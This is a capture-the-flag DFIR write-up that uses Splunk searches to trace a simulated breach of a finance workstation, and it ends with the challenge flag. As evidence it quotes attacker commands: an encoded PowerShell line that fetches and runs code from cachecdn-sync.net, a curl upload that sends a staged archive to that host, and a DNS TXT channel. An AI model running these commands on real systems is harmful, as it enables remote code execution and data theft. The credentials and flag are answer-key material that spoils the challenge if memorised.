# Phantomledger Writeup

## Challenge

- Name: `Phantomledger`
- Category: `Splunk / DFIR`
- Points: `100`
- Author: `thek0der`
- Service:
  - `http://ffbd6cbb019a1413.ctf.ac.upt.ro`
- Credentials:
  - `admin:ChangeMe123!`

## Summary

This challenge is a Splunk investigation focused on a suspicious outbound transfer from a finance workstation.

The solve path is:

1. authenticate to the Splunk web session correctly
2. use the Splunk search API to inspect the `phantomledger` index
3. pivot from the finance-workstation hypothesis into endpoint telemetry
4. identify a rare malicious process chain on `WS-FIN-044`
5. confirm staging and exfiltration to `cachecdn-sync.net`
6. recover the flag from DNS TXT chunks used as an operator recovery channel

The compromised user is:

```text
maya.ionescu
```

The compromised workstation is:

```text
WS-FIN-044
```

The final flag is:

```text
CTFAC{f650706a419b35d323b8643c14898de51c71cb61bea0e8bb1e94dc2d15fd90ac}
```

## Step 1: Authenticate to Splunk properly

The first annoyance is that Splunk web login is not just a plain POST with username and password.

The working flow is:

1. `GET /en-US/account/login?return_to=%2Fen-US%2F`
2. keep the cookies from that response, especially:
   - `cval`
   - `splunkweb_uid`
3. extract the same `cval` value from the login page
4. `POST /en-US/account/login` with:
   - `username=admin`
   - `password=ChangeMe123!`
   - `cval=<value from login page>`
   - `return_to=/en-US/`
   - `set_has_logged_in=1`
5. keep the resulting session cookies:
   - `splunkd_8000`
   - `splunkweb_csrf_token_8000`

After that, ad hoc searches work through:

```text
/en-US/splunkd/__raw/services/search/jobs/export
```

with the CSRF header:

```text
X-Splunk-Form-Key: <splunkweb_csrf_token_8000>
```

## Step 2: Enumerate the dataset

The first useful query is just a sourcetype inventory:

```spl
search index=phantomledger
| stats count by sourcetype source
| sort - count
```

That showed the challenge data is split across:

- `phantomledger:proxy`
- `phantomledger:dns`
- `phantomledger:firewall`
- `phantomledger:endpoint`
- `phantomledger:auth`
- `phantomledger:cloudtrail`
- `phantomledger:splunk_audit`

The case prompt mentions a finance workstation staging ledger exports before an unusual outbound transfer, so the most valuable telemetry is:

- endpoint events for staging behavior
- proxy and firewall events for exfiltration
- DNS for possible command-and-control or covert channels

## Step 3: Hunt for rare endpoint activity

The endpoint stream is noisy if you search for generic process names, so a good shortcut is to look for rare executables:

```spl
search index=phantomledger sourcetype=phantomledger:endpoint process_name=*
| stats count by process_name
| sort - count
```

Most results are normal background noise such as `chrome.exe`, `svchost.exe`, `powershell.exe`, and `7z.exe`.

The interesting low-frequency outliers were:

- `EXCEL.EXE`
- `curl.exe`
- `robocopy.exe`
- `rundll32.exe`

Each of those appeared only twice or fewer, which makes them ideal investigation anchors.

Pulling those exact events exposed the real attack chain on `WS-FIN-044` for `maya.ionescu`.

## Step 4: Reconstruct the attack chain

The cleanest reconstruction came from:

```spl
search index=phantomledger note="attack-chain"
| sort 0 timestamp
```

That returned the following timeline on March 18, 2026:

### Initial access and execution

At `2026-03-18 10:30:18 UTC`:

```text
"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\maya.ionescu\Downloads\invoice_Q1_projection.xlsm"
```

This is the malicious lure document:

```text
invoice_Q1_projection.xlsm
```

Immediately after that, at `2026-03-18 10:31:19 UTC`, Excel launched hidden PowerShell:

```text
powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGEAYwBoAGUAYwBkAG4ALQBzAHkAbgBjAC4AbgBlAHQALwBjAC8AcwAnACkA
```

The telemetry already ties this to the attacker domain:

```text
https://cachecdn-sync.net/c/s
```

At `2026-03-18 10:32:20 UTC`, that script moved into DLL execution:

```text
rundll32.exe C:\Users\maya.ionescu\AppData\Roaming\Microsoft\cache\wmcache.dll,Start /quiet
```

### Discovery and staging

At `2026-03-18 10:49:21 UTC`, the malware enumerated context and discovered the finance share:

```text
cmd.exe /c whoami /groups & net view \\SRV-FILE-01
```

At `2026-03-18 11:23:22 UTC`, it copied finance documents into a local staging directory:

```text
robocopy.exe "\\SRV-FILE-01\Finance\QuarterClose" "C:\ProgramData\BlueLedger\stage" *.xlsx *.csv /S /R:1 /W:1
```

That is the strongest direct evidence for the challenge story: ledger exports were staged locally before exfiltration.

### Archive creation

At `2026-03-18 12:16:23 UTC`, the staged data was packed into an encrypted archive:

```text
7z.exe a -t7z C:\ProgramData\BlueLedger\stage\ledger_q1.7z C:\ProgramData\BlueLedger\stage\* -p7zX-BlueLedger-9041 -mhe=on
```

This gives both the archive name and the password:

- archive: `C:\ProgramData\BlueLedger\stage\ledger_q1.7z`
- password: `7zX-BlueLedger-9041`

### Exfiltration

At `2026-03-18 12:42:24 UTC`, the archive was uploaded with `curl.exe`:

```text
curl.exe -k --retry 2 -F "file=@C:\ProgramData\BlueLedger\stage\ledger_q1.7z" https://drop.cachecdn-sync.net/upload
```

That is the decisive endpoint-side exfiltration command.

### Post-exfiltration recovery channel

At `2026-03-18 13:28:25 UTC`, the attacker triggered a final DNS-based action:

```text
powershell.exe -NoP -Command "$x={FLAG_B64}; nslookup -type=txt r.final.cachecdn-sync.net"
```

That strongly suggests the flag is not only in the HTTP upload chain, but also split across DNS TXT data.

## Step 5: Confirm the network side

To verify the outbound transfer and attacker infrastructure, I pivoted on the domain family:

```spl
search index=phantomledger (query="*cachecdn-sync.net*" OR url="*cachecdn-sync.net*" OR answer="*cachecdn-sync.net*" OR command_line="*cachecdn-sync.net*")
| sort 0 timestamp
```

This confirmed the compromised workstation repeatedly communicating with attacker-controlled domains such as:

- `api.cachecdn-sync.net`
- `drop.cachecdn-sync.net`
- various rotating subdomains like `asset-1870.cachecdn-sync.net`

The key proxy event is the actual upload at `2026-03-18 12:42:27 UTC`:

```text
url=https://drop.cachecdn-sync.net/upload
method=POST
status=200
user_agent=curl/8.4.0
src_host=WS-FIN-044
user=maya.ionescu
bytes_out=78439261
```

That `bytes_out` value, `78,439,261`, matches the challenge description of an unusual outbound transfer from the finance workstation.

## Step 6: Recover the flag from DNS TXT chunks

The final step was to inspect the DNS records around the attacker recovery channel:

```spl
search index=phantomledger sourcetype=phantomledger:dns src_host="WS-FIN-044" query="*cachecdn-sync.net*" earliest="2026-03-18T13:20:00" latest="2026-03-18T13:40:00"
| sort 0 timestamp
```

That returned four TXT responses marked as operator recovery traffic:

```text
2026-03-18 13:30:04 UTC  DNS-FLAG-CHUNK-0  answer=Q1RGQUN7ZjY1MDcwNmE0MTli
2026-03-18 13:31:05 UTC  DNS-FLAG-CHUNK-1  answer=MzVkMzIzYjg2NDNjMTQ4OThk
2026-03-18 13:32:06 UTC  DNS-FLAG-CHUNK-2  answer=ZTUxYzcxY2I2MWJlYTBlOGJi
2026-03-18 13:33:07 UTC  DNS-FLAG-CHUNK-3  answer=MWU5NGRjMmQxNWZkOTBhY30=
```

Concatenating those chunks gives:

```text
Q1RGQUN7ZjY1MDcwNmE0MTliMzVkMzIzYjg2NDNjMTQ4OThkZTUxYzcxY2I2MWJlYTBlOGJiMWU5NGRjMmQxNWZkOTBhY30=
```

Base64-decoding that string yields:

```text
CTFAC{f650706a419b35d323b8643c14898de51c71cb61bea0e8bb1e94dc2d15fd90ac}
```

## Final Answer

```text
CTFAC{f650706a419b35d323b8643c14898de51c71cb61bea0e8bb1e94dc2d15fd90ac}
```

---
* [🔙 Back to Cloud Security Directory](../)
* [🔙 Back to Cloud Security Index Directory](../INDEX.md)
* [🔙 Back to Main Directory](../../README.md)
